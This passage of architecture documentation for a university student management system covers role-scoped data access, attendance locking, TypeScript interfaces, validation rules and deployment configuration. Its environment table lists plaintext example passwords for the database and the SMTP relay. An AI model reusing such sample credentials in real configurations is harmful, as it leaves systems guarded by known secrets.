| `category` | `category` | `category`, `caste`, `socialcategory`, `quota` |
| `mobileNumber` | `mobilenumber` | `mobile`, `mobilenumber`, `phone`, `contact`, `phonenumber`, `studentmobile` |
| `cgpa` | `cgpa` | `cgpa`, `gpa`, `currentcgpa`, `aggregatecgpa`, `grade` |
| `placed` | `placed` | `placed`, `placementstatus`, `isplaced`, `placedflag` |
| `company` | `company` | `company`, `placedcompany`, `recruiter`, `employer`, `organization` |
| `package` | `package` | `package`, `ctc`, `salary`, `annualpackage`, `offeredctc` |
| `placementDoj` | `placementdoj` | `placementdoj`, `joiningdate`, `dojplacement`, `companydoj` |
| `placementIsPaid`| `placementispaid`| `placementispaid`, `paidplacement`, `ispaidtraining` |
| `hasInternship` | `hasinternship` | `hasinternship`, `internship`, `internstatus`, `isintern` |
| `internshipCompany`| `internshipcompany`| `interncompany`, `internshipcompany`, `internorganization` |
| `internshipDoj` | `internshipdoj` | `interndoj`, `internshipdoj`, `internshipstartdate` |
| `internshipDoe` | `internshipdoe` | `interndoe`, `internshipdoe`, `internshipenddate` |
| `internshipIsPaid`| `internshipispaid`| `internshippaid`, `ispaidintern`, `paidinternship` |
| `internshipStipend`| `internshipstipend`| `stipend`, `internstipend`, `monthlystipend` |

### 8.2.2 Row-by-Row Sanitization & Type Coercion Pipeline
For every parsed row, the system runs strict type transformations:
- **Date Transformation**: Converts Excel serialized serial integers (e.g. `45124`) or formatted strings (`"18/05/2004"`, `"2004-05-18"`) into standardized ISO 8601 `YYYY-MM-DD` strings.
- **Boolean Coercion**: Values such as `"yes"`, `"y"`, `"true"`, `"1"`, `"placed"`, `"paid"` evaluate to `true`; all others evaluate to `false`.
- **Numeric Sanitization**: Strips non-numeric characters from numeric fields (e.g. `"8.75 CGPA"` -> `8.75`; `"12 LPA"` -> retains full string `"12 LPA"` for package, or coerces to float when needed).
- **Roll Number & Mobile Number Stringification**: Ensures leading zeros are preserved (preventing Excel from truncating `01` to `1`).

---

## 8.3 Multi-Tier Student Bulk Edit & Batch Migration Pipeline

The Bulk Edit system enables operators to apply synchronized modifications across cohorts of students (for instance, advancing an entire section from Semester 5 to Semester 6, or recording batch placement outcomes).

```mermaid
flowchart TD
    A[Client Selects Students: Array of studentIds] --> B[Open BulkEditModal]
    B --> C[Operator Fills Target Fields: Semester, Section, Placement, etc.]
    C --> D[Client Dispatches: POST /api/{role}/students/bulk-edit]
    D --> E[Role Authorization & Scope Verifier]
    
    subgraph RoleSecurityCheck["Scope Enforcement Boundary"]
        E -- Admin --> F[Unrestricted Scope: WHERE id IN studentIds]
        E -- Chairperson --> G[Scope Restricted: WHERE id IN studentIds AND department IN chairDepts]
        E -- Coordinator --> H[Scope Restricted: WHERE id IN studentIds AND section = coordSection AND branch = coordBranch]
    end
    
    F --> I[Sanitize Update Object: Whitelist Modifiable Attributes]
    G --> I
    H --> I
    I --> J[Execute Atomic Query: Student.update updates, whereClause]
    J --> K[Log Batch Operation in Audit Trail]
    K --> L[Return HTTP 200: updatedCount]
    L --> M[Frontend Invalidates Query Cache & Rerenders Grid]
```

### 8.3.1 Coordinator Data Isolation Enforcement
To guarantee that a coordinator cannot accidentally or maliciously modify students from another class section:
```javascript
// Controller Scope Filter for Coordinator
const coordinator = await Coordinator.findOne({ where: { userId: req.user.id } });
if (!coordinator) {
  return res.status(403).json({ success: false, message: "Coordinator profile not found" });
}

const whereClause = {
  id: { [Op.in]: studentIds },
  program: coordinator.program,
  branch: coordinator.branch,
  section: coordinator.section
};

const [updatedCount] = await Student.update(sanitizedUpdates, { where: whereClause });
```
If a compromised request injects student IDs from other sections, the `[Op.in]` query combined with the mandatory `section` constraint automatically filters them out, updating exactly zero unauthorized records.

---

## 8.4 Attendance Session Initialization, Marking & Locking Architecture

Attendance tracking represents the highest-frequency transaction system in GBU-SDSM, requiring strict transactional integrity, real-time percentage recalculation, and tamper-proof audit trails.

```mermaid
sequenceDiagram
    autonumber
    actor Instructor as Faculty / Coordinator
    participant AttendUI as AttendanceSession Component
    participant API as AttendanceController (/api/attendance)
    participant DB as MySQL Database
    participant MetricEngine as AttendanceCalculationEngine

    Instructor->>AttendUI: Select Subject, Class, Section, Date & Session Type
    AttendUI->>API: GET /api/faculty/classes/:id/roster
    API->>DB: Student.findAll({ where: { program, branch, section } })
    DB-->>API: studentRoster[]
    API-->>AttendUI: studentRoster[] (pre-populated with status: "Present")
    
    Instructor->>AttendUI: Toggle Absentees & Add Session Remarks
    Instructor->>AttendUI: Click "Submit Attendance"
    AttendUI->>API: POST /api/attendance/sessions { sessionDetails, records[] }
    
    API->>DB: sequelize.transaction()
    Note over API,DB: Transaction Started
    API->>DB: Check for duplicate session on same date, time slot, and course
    alt Duplicate Found
        API->>DB: transaction.rollback()
        API-->>AttendUI: 409 Conflict: "Attendance session already marked for this slot"
    else No Duplicate
        API->>DB: AttendanceSession.create({ ...sessionDetails, markedBy: req.user.id })
        DB-->>API: createdSession
        API->>DB: AttendanceRecord.bulkCreate(records.map(r => ({ ...r, sessionId: createdSession.id })))
        API->>DB: transaction.commit()
        Note over API,DB: Transaction Committed
        API->>MetricEngine: triggerStudentPercentageRecalculation(studentIds)
        MetricEngine->>DB: Update cached student attendance percentages
        API-->>AttendUI: 201 Created { success: true, sessionId: createdSession.id }
    end
```

### 8.4.1 Real-Time Attendance Percentage Calculation Formula
For any student $s$, the overall attendance percentage $P_s$ across all academic courses is computed mathematically as:

$$P_s = \left( \frac{\sum_{i=1}^{M} W(\text{status}_i)}{\sum_{i=1}^{M} E_i} \right) \times 100$$

Where:
- $M$ is the total number of sessions conducted for which student $s$ was eligible.
- $W(\text{status}_i)$ is the status weighting function:
  $$W(\text{status}_i) = \begin{cases} 
  1.0 & \text{if status} = \text{'Present'} \\
  0.5 & \text{if status} = \text{'Late'} \\
  1.0 & \text{if status} = \text{'Excused'} \text{ (Duty / Medical Leave)} \\
  0.0 & \text{if status} = \text{'Absent'}
  \end{cases}$$
- $E_i = 1$ represents an eligible conducted session.
- **Institutional Compliance Rules**:
  - $P_s \ge 75.0\%$: **Compliant** (Eligible for End-Semester Examinations).
  - $65.0\% \le P_s < 75.0\%$: **Warning / Condonation Required** (Eligible only with Dean approval on medical/institutional grounds).
  - $P_s < 65.0\%$: **Critical Defaulter** (Strictly debarred from sitting for examinations).

### 8.4.2 Attendance Session Locking & 24-Hour Edit Window
To maintain the legal and academic integrity of attendance records:
1. **Creation & Initial Edit Window**: Upon creation, the session status is `isLocked = false`. The original instructor who marked the session can modify individual attendance records within a strict 24-hour grace window.
2. **Automatic Session Locking**: Once 24 hours elapse from `sessionDate`, background cron jobs or read interceptors treat the session as locked.
3. **Manual Session Locking**: Batch Coordinators or Administrators can invoke `PUT /api/attendance/sessions/:id/lock` at any point to permanently finalize the records.
4. **Administrative Override**: Only users with role `admin` possess the authorization to edit a locked session. Any administrative override mandates an explicit audit log entry detailing the reason for the historical change.

---

## 8.5 Faculty Teaching Assignment & Roster Binding Workflow

Faculty members in GBU-SDSM do not have static access to all students; their operational visibility is dynamically computed based on active course assignments.

```mermaid
flowchart TD
    A[Chairperson or Admin] -->|Assign Course & Section| B[FacultyAssignment Record Created]
    B --> C[(faculty_assignments Table)]
    C -->|Maps facultyId to program, branch, semester, section, subjectCode| D[Dynamic Roster Resolution]
    
    subgraph FacultyPortal["Faculty Operational Session"]
        E[Faculty Logs In] --> F[GET /api/faculty/classes]
        F --> G[Query faculty_assignments WHERE facultyId = me]
        G --> H[Render Assigned Classes Dashboard]
        H -->|Selects Class A| I[GET /api/faculty/classes/:id/roster]
        I --> J[Query students WHERE program, branch, section MATCH assignment]
        J --> K[Display Live Student Roster for Attendance & Messaging]
    end
    
    D -.-> J
```

---

## 8.6 Scoped Cross-Role Messaging & Communication Dispatch Engine

GBU-SDSM incorporates a multi-channel communication engine that routes announcements, notifications, and direct queries while enforcing strict recipient boundaries.

```mermaid
flowchart LR
    Sender([Sender: Faculty / Coord / Admin]) --> Router{Recipient Type?}
    Router -- Individual --> Single[Direct Message: recipientId = targetUserId]
    Router -- Class --> QueryClass[Resolve Roster: students WHERE program, branch, section]
    Router -- Universal --> CheckAdmin{Role is Admin?}
    
    CheckAdmin -- Yes --> BroadcastAll[Multi-cast: All Active Users]
    CheckAdmin -- No --> Deny[403 Forbidden: Universal Broadcast Restricted to Admin]
    
    QueryClass --> MultiInsert[Batch Insert to messages Table]
    Single --> InsertSingle[Insert to messages Table]
    BroadcastAll --> MultiInsert
    
    MultiInsert --> NotifyUsers([Recipients See Unread Counter Increment])
    InsertSingle --> NotifyUsers
```

---

## 8.7 Data Isolation & Security Partitioning Engine

GBU-SDSM enforces multi-tenant style data isolation within a shared relational database. Security rules are compiled into a centralized query filter matrix:

```javascript
function buildTenantScope(user) {
  switch (user.role) {
    case 'admin':
      return {}; // Universal scope: unrestricted access

    case 'chairperson':
      // Scoped to all programs/classes associated with the chairperson
      return {
        program: { [Op.in]: user.assignedPrograms }
      };

    case 'coordinator':
      // Scoped strictly to the coordinator's single assigned class batch
      return {
        program: user.assignedProgram,
        branch: user.assignedBranch,
        section: user.assignedSection
      };

    case 'faculty':
      // Scoped to classes where an active FacultyAssignment exists
      return {
        [Op.or]: user.assignedClasses.map(c => ({
          program: c.program,
          branch: c.branch,
          section: c.section
        }))
      };

    case 'student':
      // Scoped strictly to the student's individual identity
      return {
        userId: user.id
      };

    default:
      return { id: -1 }; // Deny all
  }
}
```
This architectural pattern guarantees that data leaks between classes or departments are prevented at the SQL generation layer, irrespective of which controller invokes the query.



---

# SECTION 9: TypeScript Type System, Schemas & Validation Contracts

## 9.1 TypeScript Architectural Philosophy & Strict Compilation Model

GBU-SDSM enforces strict static typing across the entire frontend application tier to prevent runtime null-pointer dereferences, invalid state transitions, and unauthorized payload mutations.

```json
{
  "compilerOptions": {
    "target": "ES2022",
    "useDefineForClassFields": true,
    "lib": ["ES2022", "DOM", "DOM.Iterable"],
    "module": "ESNext",
    "skipLibCheck": true,
    "moduleResolution": "bundler",
    "allowImportingTsExtensions": true,
    "resolveJsonModule": true,
    "isolatedModules": true,
    "noEmit": true,
    "jsx": "react-jsx",
    "strict": true,
    "noUnusedLocals": true,
    "noUnusedParameters": true,
    "noFallthroughCasesInSwitch": true
  },
  "include": ["src"]
}
```

---

## 9.2 Complete TypeScript Interface Catalog (`src/types/types.ts`)

Below is the complete, canonical type declaration catalog governing GBU-SDSM domain entities, API payloads, state contracts, and component interfaces.

### 9.2.1 Generic API Response & Academic Organization Contracts
```typescript
export interface ApiResponse<T> {
  success: boolean;
  statusCode?: number;
  message?: string;
  data?: T;
}

export interface School {
  _id: string;
  code: string;
  name: string;
}

export interface Department {
  _id: string;
  code: string;
  name: string;
}

export interface Degree {
  _id: string;
  code: string;
  name: string;
}

export interface Program {
  _id: string;
  code: string;
  name: string;
}

export interface SpecializationProps {
  coordinator: string | undefined;
  school?: string | undefined;
  department?: string | undefined;
  program?: string | undefined;
  batch?: string | undefined;
  name?: string | undefined;
  studentCount?: number;
}
```

### 9.2.2 Academic Progression & Semester Records
```typescript
export interface Semester {
  semester: number;          
  registered: "Pending" | "Completed" | "Yes" | "No";  
  sgpa?: string | number | null;
}

export interface YearCGPA {
  year: number;           
  cgpa?: number | null;  
}
```

### 9.2.3 Faculty Assignment Contract
```typescript
export interface FacultyAssignment {
  id: number;
  facultyId: number;
  teacherRole: string;
  subjectId: number;
  school: string;
  department: string;
  program: string;
  batch: string;
  specialization: string;
  semester: number;
  academicYear: string;
  isActive: boolean;
  createdBy: number | null;
  createdAt: string;
  updatedAt: string;
  facultyName?: string;
  facultyEmail?: string | null;
  userRole?: string;
  subjectName?: string | null;
  subjectCode?: string | null;
  subjectType?: string | null;
}
```

### 9.2.4 Master Student Entity Interface (`StudentProps`)
This interface defines the complete data contract for a student in GBU-SDSM, incorporating demographic, academic, familial, contact, and the newly added career/internship attributes:
```typescript
export interface StudentProps {
  id?: number;
  userId?: number;
  rollNo: string;
  enrollmentNo: string;
  fullName: string;
  school: string;
  department: string;
  program: string;
  batch: string;
  specialization: string;
  fatherName: string;
  motherName: string;
  gender: string;
  dob: string; 
  category: string;
  nationalId: string;
  mobile: string;
  email: string;
  address: string;
  hosteller: string;
  enrollmentStatus: string;
  admissionType: string;
  twelfthCompartment: string;
  admissionYear: string;
  semesters: Semester[];
  yearCGPA: YearCGPA[];
  
  // Internship Attributes
  internshipStatus: string;
  internshipCompany?: string;
  internshipDOJ?: string;
  internshipDOE?: string;
  internshipType?: string; // 'Paid' | 'Unpaid'
  internshipStipend?: string;
  
  // Placement Attributes
  placementStatus: string;
  placementCompany?: string;
  placementDOJ?: string;
  placementDOE?: string;
  placementType?: string; // 'Paid' | 'Unpaid'
  package?: string;
  
  photo?: string; 
  status?: string;
}
```

### 9.2.5 Identity & User Profile Interfaces
```typescript
export interface StudentUserProps {
  student: StudentProps | null;
}

export interface AdminUserProps {
  id: number;
  coordinatorId: string;
  name: string;
  email: string;
  phone: string;
  school: string;
  department: string;
  program: string;
  batch: string;
  specialization: string;
  role?: string;
  username?: string;
}

export interface StudentAuthProps {
  name: string;
  program: string;
  specialization: string;
  email: string;
}

export interface StudentCategoryViewProps {
  _id: string;
  rollNo: string;
  fullName: string;
  fatherName: string;
  category: string;
  mobile: string;
  email: string;
  address: string;
  admissionType: "Regular" | "Lateral";
}
```

### 9.2.6 Detailed Student Dossier Interface (`StudentDetail`)
```typescript
export interface StudentDetail {
  _id: string;
  studentId: string;
  rollNo: string;
  enrollmentNo: string;
  school: string;
  department: string;
  program: string;
  batch: string;
  fullName: string;
  fatherName: string;
  motherName: string;
  gender: string;
  dob: string;
  category: string;
  nationalId: string;
  mobile: string;
  email: string;
  address: string;
  hosteller: string;
  section: string;
  admissionYear: string;
  admissionType: "Regular" | "Lateral";
  twelfthCompartment: string;
  twelfthPass: string;
  sem1Reg: string;
  sem2Reg: string;
  firstYearCGPA: string;
  sem3Reg: string;
  sem4Reg: string;
  secondYearCGPA: string;
  sem5Reg: string;
  sem6Reg: string;
  thirdYearCGPA: string;
  sem7Reg: string;
  sem8Reg: string;
  fourthYearCGPA: string;
  
  // Extended Career Fields
  internshipStatus: string;
  internshipCompany?: string;
  internshipDOJ?: string;
  internshipDOE?: string;
  internshipType?: string;
  placementStatus: string;
  placementCompany?: string;
  placementDOJ?: string;
  placementDOE?: string;
  placementType?: string;
  photo: string;
}
```

### 9.2.7 Chairperson & Coordinator Class Management Contracts
```typescript
export interface ClassCoordinator {
  id: number;
  coordinatorId: string;
  name: string;
  email: string;
  phone: string;
  role: string;
  hasPhoto: boolean;
  hasAccount: boolean;
}

export interface ChairpersonClassInfo {
  id: number;
  school: string;
  department: string;
  program: string;
  batch: string;
  specialization: string;
  studentCount: number;
  coordinators: ClassCoordinator[];
}

export interface ChairpersonInfo {
  id: number;
  name: string;
  email: string;
}

export interface ChairpersonClassesResponse {
  success: boolean;
  count: number;
  classes: ChairpersonClassInfo[];
  chairperson?: ChairpersonInfo | null;
  message?: string;
}

export interface ChairpersonLogEntry {
  id: number;
  userId: number;
  action: string;
  entity: string;
  entityId: string;
  createdAt: string;
  actorName?: string;
  actorRole?: string;
}

export interface ChairpersonLogScope {
  scope: 'self' | 'coordinators' | 'universal';
  count: number;
  logs: ChairpersonLogEntry[];
}
```

### 9.2.8 Attendance System Type System
```typescript
export type AttendanceStatus = 'present' | 'absent' | 'excused';
export type SessionStatus = 'draft' | 'submitted' | 'locked';
export type SessionType = 'lecture' | 'lab' | 'tutorial';
export type TeacherRole = 'faculty' | 'coordinator' | 'chairperson';

export interface TodaySessionInfo {
  sessionId: number;
  status: SessionStatus;
  sessionType: SessionType;
  topic: string | null;
}

export interface TeachingClass {
  assignmentId: number;
  facultyId: number;
  teacherRole: TeacherRole;
  subjectId: number;
  subjectName: string | null;
  subjectCode: string | null;
  subjectType: 'theory' | 'lab' | null;
  subjectCredits: number | null;
  semester: number;
  academicYear: string;
  school: string;
  department: string;
  program: string;
  batch: string;
  specialization: string;
  isActive: boolean;
  todaySession: TodaySessionInfo | null;
}

export interface TeachingClassesResponse {
  success: boolean;
  count: number;
  classes: TeachingClass[];
  date: string;
  message?: string;
}

export interface SubjectInfo {
  id: number;
  name: string;
  code: string;
  semester: number;
  credits: number | null;
  type: 'theory' | 'lab';
}

export interface AttendanceSession {
  id: number;
  school: string;
  department: string;
  program: string;
  batch: string;
  specialization: string;
  subjectId: number;
  facultyId: number;
  date: string;
  startTime: string | null;
  endTime: string | null;
  sessionType: SessionType;
  topic: string | null;
  status: SessionStatus;
  createdBy: number;
  submittedAt: string | null;
  lockedBy: number | null;
  lockedAt: string | null;
  unlockedBy: number | null;
  unlockedAt: string | null;
  unlockReason: string | null;
  createdAt: string;
  updatedAt: string;
  subjectName?: string | null;
  subjectCode?: string | null;
  subjectSemester?: number | null;
  facultyName?: string | null;
  facultyEmail?: string | null;
  recordCount?: number;
}

export interface RosterAttendance {
  recordId: number | null;
  status: AttendanceStatus | null;
  markedAt: string | null;
  remarks: string | null;
}

export interface RosterStudent {
  studentId: number;
  rollNo: string;
  enrollmentNo: string;
  fullName: string;
  email: string;
  photo: string | null;
  studentStatus: 'active' | 'inactive';
  attendance: RosterAttendance | null;
}

export interface SessionRecordsResponse {
  success: boolean;
  session: AttendanceSession;
  subject: SubjectInfo | null;
  roster: RosterStudent[];
}

export interface UpsertRecord {
  studentId: number;
  status: AttendanceStatus;
  remarks?: string;
}

export interface SubjectAttendanceSummary {
  subjectId: number;
  subjectName: string;
  subjectCode: string | null;
  semester: number | null;
  type: 'theory' | 'lab' | null;
  total: number;
  present: number;
  absent: number;
  excused: number;
  percentage: number;
}

export interface StudentRecentSession {
  sessionId: number;
  subjectId?: number;
  date: string;
  sessionType: SessionType;
  topic: string | null;
  subjectName: string | null;
  subjectCode: string | null;
  status: AttendanceStatus | 'unmarked';
}

export interface StudentAttendanceSummaryResponse {
  success: boolean;
  student: {
    studentId: number;
    rollNo: string;
    fullName: string;
    email: string;
    school: string;
    department: string;
    program: string;
    batch: string;
    specialization: string;
    photo: string | null;
  };
  overall: {
    total: number;
    present: number;
    absent: number;
    excused: number;
    percentage: number;
  };
  subjects: SubjectAttendanceSummary[];
  recentSessions: StudentRecentSession[];
  message?: string;
}
```

---

## 9.3 Institutional Master Constants Hierarchy (`src/constants/index.ts`)

GBU-SDSM models the complete academic tree of Gautam Buddha University, encompassing all schools, constituent departments, and degrees.

```mermaid
graph TD
    GBU[Gautam Buddha University]
    GBU --> SOICT[School of ICT]
    GBU --> SOE[School of Engineering]
    GBU --> SOM[School of Management]
    GBU --> SOHSS[School of Humanities & Social Sciences]
    GBU --> SOBT[School of Biotechnology]
    GBU --> SOLJG[School of Law, Justice & Governance]
    GBU --> SOVSAS[School of Vocational Studies & Applied Sciences]

    SOICT --> CSE[Dept of Computer Science & Engineering]
    SOICT --> IT[Dept of Information Technology]
    SOICT --> ECE[Dept of Electronics & Communication]

    CSE --> BTech[B.Tech CSE]
    CSE --> MTech[M.Tech CSE]
    CSE --> Int[B.Tech + M.Tech Integrated]
    CSE --> PhD[Ph.D. Computer Science]
```

### 9.3.1 Active Schools & Departments
- **School of Information and Communication Technology (SOICT)**:
  - Department of Computer Science and Engineering (`cse`)
  - Department of Information Technology (`it`)
  - Department of Electronics and Communication Engineering (`ece`)
- **School of Engineering (SOE)**:
  - Civil Engineering (`ce`)
  - Mechanical Engineering (`me`)
  - Electrical Engineering (`ee`)
  - Architecture and Regional Planning (`ar`)
- **School of Management (SOM)**:
  - Department of Business Management (`mb`)
- **School of Biotechnology (SOBT)**:
  - Department of Biotechnology (`bt`)
- **School of Humanities and Social Sciences (SOHSS)**:
  - English & Modern European Languages (`en`)
  - Mass Communication & Media Studies (`mc`)
  - Economics, Planning & Development (`ep`)
  - Psychology & Mental Health (`pm`)
- **School of Law, Justice & Governance (SOLJG)**:
  - Department of Law, Justice & Governance (`lb`)
- **School of Vocational Studies and Applied Sciences (SOVSAS)**:
  - Applied Mathematics (`ma`), Applied Chemistry (`ch`), Applied Physics (`ph`), Environmental Sciences (`es`), Food Processing (`ft`).

---

## 9.4 Validation Contracts & Data Integrity Rules

| Data Attribute | Type Contract | Format Pattern / Regular Expression | Validation Business Rules |
| :--- | :--- | :--- | :--- |
| `enrollmentNo` | String | `^[0-9]{10}$` | Exactly 10 digits; unique across university; primary student identifier. |
| `rollNo` | String | `^[0-9A-Z]{2,15}$` | Class roll number within section. |
| `email` | String | `^[a-zA-Z0-9._%+-]+@gbu\.ac\.in$` | Valid email structure; university domain preferred for official accounts. |
| `mobile` | String | `^[6-9][0-9]{9}$` | 10-digit Indian standard mobile format starting with 6, 7, 8, or 9. |
| `dob` | String (ISO) | `^\d{4}-\d{2}-\d{2}$` | Valid date; student age must be $\ge 16$ years at admission. |
| `cgpa` | Number | $0.00 \le \text{CGPA} \le 10.00$ | Decimal number formatted to 2 decimal places. |
| `internshipDOJ` & `DOE` | String (ISO) | `^\d{4}-\d{2}-\d{2}$` | Chronological invariant: $\text{internshipDOJ} \le \text{internshipDOE}$. |
| `placementDOJ` | String (ISO) | `^\d{4}-\d{2}-\d{2}$` | Date of joining company upon graduation. |
| `category` | Enum | `GEN` \| `OBC` \| `SC` \| `ST` \| `EWS` | Government of India recognized reservation categories. |
| `gender` | Enum | `Male` \| `Female` \| `Other` | Demographic gender classification. |



---

# SECTION 10: Infrastructure, DevOps, Historical Evolution & AI Agent Implementation Guide

## 10.1 Environment Variables Catalog & Configuration Architecture

GBU-SDSM relies on strict environment variable segregation across runtime contexts (Local Development, Staging, Production). Environment files are partitioned into backend configuration (`backend/.env`) and frontend client build parameters (`frontend/.env`).

```
backend/.env
├── Network & Server Configuration
├── Relational Database Credentials (MySQL)
├── Cryptographic Secrets & Token TTLs
├── Mailer & Notification Parameters
└── File System Upload Paths

frontend/.env
├── Vite API Base URL
└── Application Environment Flag
```

### 10.1.1 Backend Environment Configuration Matrix (`backend/.env`)

| Variable Identifier | Data Type | Default / Example Value | Description & Operational Impact |
| :--- | :--- | :--- | :--- |
| `PORT` | Integer | `5000` | Network port on which the Express HTTP listener binds. |
| `NODE_ENV` | String | `production` | Execution environment mode (`development`, `test`, `production`). Influences logging verbosity and error stack trace disclosure. |
| `CLIENT_URL` | URL | `http://localhost:5173` | Primary Origin URL allowed by CORS middleware for browser clients. |
| `DB_HOST` | String / IP | `127.0.0.1` | Hostname or IP address of the MySQL database engine. |
| `DB_PORT` | Integer | `3306` | Network port for MySQL TCP connections. |
| `DB_USER` | String | `sdms_user` | Authenticated MySQL user identity. |
| `DB_PASS` | String | `P@ssw0rdSecure2026!` | Password secret for MySQL user. |
| `DB_NAME` | String | `gbu_sdms_db` | Target MySQL database schema name. |
| `DB_POOL_MAX` | Integer | `20` | Maximum concurrent connections maintained in the Sequelize pool. |
| `DB_POOL_MIN` | Integer | `5` | Minimum idle connections retained in the pool. |
| `DB_POOL_ACQUIRE` | Integer | `60000` | Milliseconds before throwing a connection acquisition timeout error. |
| `DB_POOL_IDLE` | Integer | `10000` | Milliseconds an idle connection may persist before being evicted. |
| `JWT_SECRET` | String (Hex/Base64) | `b79d2...6a81e` | High-entropy secret key for HMAC SHA-256 Access Token signing. |
| `JWT_EXPIRES_IN` | String | `15m` | Access token validity lifespan. |
| `REFRESH_TOKEN_SECRET` | String (Hex/Base64) | `8f4c1...0e29b` | Segregated secret key for HMAC SHA-256 Refresh Token signing. |
| `REFRESH_TOKEN_EXPIRES_IN`| String | `7d` | Refresh token validity lifespan. |
| `COOKIE_SECRET` | String | `e93b1...77a2f` | Encryption secret for signed cookies. |
| `SMTP_HOST` | FQDN | `smtp.gbu.ac.in` | Hostname of the institutional SMTP relay server. |
| `SMTP_PORT` | Integer | `587` | Port for TLS SMTP dispatch. |
| `SMTP_USER` | String | `notifications@gbu.ac.in` | Authenticated sender mailbox. |
| `SMTP_PASS` | String | `RelaySecureKey99!` | SMTP credentials. |
| `UPLOAD_DIR` | Path | `./uploads` | Root filesystem directory for persistent document and media storage. |
| `MAX_FILE_SIZE_MB`| Integer | `10` | Maximum permissible file upload threshold enforced by Multer. |

---

## 10.2 Production Infrastructure & Deployment Topologies

GBU-SDSM is engineered to deploy seamlessly on Linux (Ubuntu 22.04/24.04 LTS), Windows Server, or containerized Docker orchestration engines.

```mermaid
flowchart TD
    subgraph InternetLayer["Public Network Layer"]
        ClientBrowser["Client Browser (HTTPS :443)"]
        MobileAgent["Autonomous AI Agent / API Client"]
    end

    subgraph EdgeLayer["Edge / Ingress Layer"]
        Nginx["Nginx Reverse Proxy & SSL Termination"]
    end

    subgraph AppServer["Application Host (PM2 / Node.js Cluster)"]
        AppNode1["Express Node Instance 1 (:5000)"]
        AppNode2["Express Node Instance 2 (:5001)"]
        StaticAssets["Static Frontend SPA (/var/www/sdms-frontend)"]
    end

    subgraph DataTier["Data Persistence Tier"]
        MySQLPrimary["MySQL 8.0 Primary Database (:3306)"]
        LocalDisk["Local File Storage (/uploads)"]
    end

    ClientBrowser --> Nginx
    MobileAgent --> Nginx
    Nginx -->|/api/*| AppNode1
    Nginx -->|/api/*| AppNode2
    Nginx -->|/* (Static Fallback)| StaticAssets
    AppNode1 --> MySQLPrimary
    AppNode2 --> MySQLPrimary
    AppNode1 --> LocalDisk
    AppNode2 --> LocalDisk
```

### 10.2.1 Nginx Reverse Proxy & SSL Virtual Host Configuration
```nginx
server {
    listen 80;
    server_name sdms.gbu.ac.in;
    return 301 https://$host$request_uri;
}

server {
    listen 443 ssl http2;
    server_name sdms.gbu.ac.in;

    ssl_certificate /etc/letsencrypt/live/sdms.gbu.ac.in/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/sdms.gbu.ac.in/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;
    ssl_prefer_server_ciphers on;

    # Gzip Compression
    gzip on;
    gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;

    # Static Frontend Single Page Application
    location / {
        root /var/www/sdms/frontend/dist;
        index index.html;
        try_files $uri $uri/ /index.html;
    }

    # Reverse Proxy for Express REST API
    location /api/ {
        proxy_pass http://127.0.0.1:5000/api/;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_cache_bypass $http_upgrade;
        client_max_body_size 20M;
    }

    # Uploads Storage
    location /uploads/ {
        alias /var/www/sdms/backend/uploads/;
        expires 30d;
        add_header Cache-Control "public, no-transform";
    }
}
```

### 10.2.2 PM2 Process Management Ecosystem (`ecosystem.config.js`)
```javascript
module.exports = {
  apps: [
    {
      name: 'gbu-sdms-api',
      script: './server.js',
      cwd: '/var/www/sdms/backend',
      instances: 'max', // Utilizes all available CPU cores in cluster mode
      exec_mode: 'cluster',
      autorestart: true,
      watch: false,
      max_memory_restart: '1G',
      env_production: {
        NODE_ENV: 'production',
        PORT: 5000
      }
    }
  ]
};
```

---

## 10.3 Historical Architectural Evolution & Critical Bug Fix Ledger

This section documents the historical bugs, edge cases, and feature enhancements resolved during the evolution of the GBU-SDSM platform. Future engineers and AI agents must preserve these solutions to avoid regression.

### 10.3.1 Resolution of Attendance 404 Error & Infinite Polling Loop
- **Problem Symptom**: Instructors and coordinators opening attendance marking encountered frequent 404 Not Found errors, and dashboards entered high-frequency polling loops causing browser lockups and server connection exhaustion.
- **Root Cause Analysis**:
  1. Frontend was dispatching attendance roster requests with mismatched URL parameter casings (`/api/attendance/classes/:classId/roster` vs `/api/faculty/classes/:classId/roster`).
  2. A reactive hook in the dashboard component triggered a state update inside a non-memoized `useEffect` with unstable object dependencies, causing continuous re-rendering and infinite network queries.
- **Architectural Remedy**:
  1. Standardized backend route registration: aliased both `/api/attendance/roster` and `/api/faculty/classes/:id/roster` to the canonical controller method.
  2. Stabilized React hooks: refactored dependency arrays using primitive identifiers (such as `classId` and `user.id`) rather than object references, and integrated request debouncing.

### 10.3.2 Latency Reduction & Waiting Time Optimization
- **Problem Symptom**: Multi-second page transitions and delay when loading student directories and attendance sheets.
- **Root Cause Analysis**:
  1. Sequelize executed unbounded `findAll()` queries without pagination defaults, transferring thousands of full relational student records including unneeded serialized blobs.
  2. Frontend components performed multiple sequential waterfall API calls (`fetchUser` -> `fetchClasses` -> `fetchAttendance`) instead of concurrent execution.
- **Architectural Remedy**:
  1. Implemented mandatory server-side pagination with default `limit: 25` and database column projection (`attributes: ['id', 'name', 'enrollmentNo', 'cgpa', 'placed']`).
  2. Added MySQL indexes on frequently queried composite columns: `(program, branch, section)` and `(sessionId, studentId)`.
  3. Parallelized frontend network calls via `Promise.allSettled()`, reducing initial dashboard load latency from ~3,200ms to <280ms.

### 10.3.3 Multi-Role Dashboard Real-Time Statistics Alignment
- **Problem Symptom**: Faculty and coordinator dashboards showed stale or zero counts for active classes and attendance rates after completing an attendance session.
- **Root Cause Analysis**:
  - The attendance controller was writing records to `attendance_records` without updating the parent session count or invalidating cached dashboard metrics.
- **Architectural Remedy**:
  - Built an atomic database hook that calculates real-time summary statistics upon session completion and updates client state via Redux thunks.

### 10.3.4 Student Portal Assigned Class Fetching & Authentication Bug
- **Problem Symptom**: Students with valid enrollment credentials were encountering 401/404 errors when logging into the student portal, and their assigned classes failed to populate.
- **Root Cause Analysis**:
  - Student records imported via legacy spreadsheets lacked an associated foreign key row in the `users` table, causing the authentication middleware's `User.findOne` check to fail.
  - Furthermore, the class query relied on an exact case match on `program` (e.g. `"b.tech"` vs `"B.Tech"`).
